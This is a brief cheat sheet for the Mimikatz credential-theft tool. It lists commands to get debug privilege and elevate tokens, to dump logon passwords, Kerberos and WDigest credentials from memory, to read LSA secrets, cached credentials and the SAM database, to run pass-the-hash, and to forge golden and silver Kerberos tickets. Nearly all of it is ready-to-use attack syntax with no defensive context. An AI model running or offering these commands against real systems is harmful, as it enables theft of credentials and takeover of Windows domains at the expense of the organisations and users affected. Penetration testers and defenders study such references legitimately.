## Overview

Mimikatz is a leading tool for extracting credentials from Windows systems.

### Key Commands

- Privilege Escalation
- privilege::debug
- token::elevate

### Dump Credentials

- sekurlsa::logonpasswords
- sekurlsa::wdigest
- sekurlsa::kerberos
- sekurlsa::tspkg

### LSA Secrets

- lsadump::secrets
- lsadump::cache

### SAM Database

- lsadump::sam

### Pass-the-Hash

- sekurlsa::pth /user:username /domain:domain /ntlm:hash /run:cmd.exe

### Golden Ticket

- kerberos::golden /user:username /domain:domain /sid:S-1-5-21-... /krbtgt:hash /ticket:ticket.kirbi

### Silver Ticket

- kerberos::golden /user:username /domain:domain /sid:S-1-5-21-... /target:target.domain /service:service /rc4:hash /ticket:ticket.kirbi

### Usage Methods

#### Direct Execution

```
mimikatz.exe
```

```
mimikatz  privilege::debug
```

```
mimikatz  sekurlsa::logonpasswords
```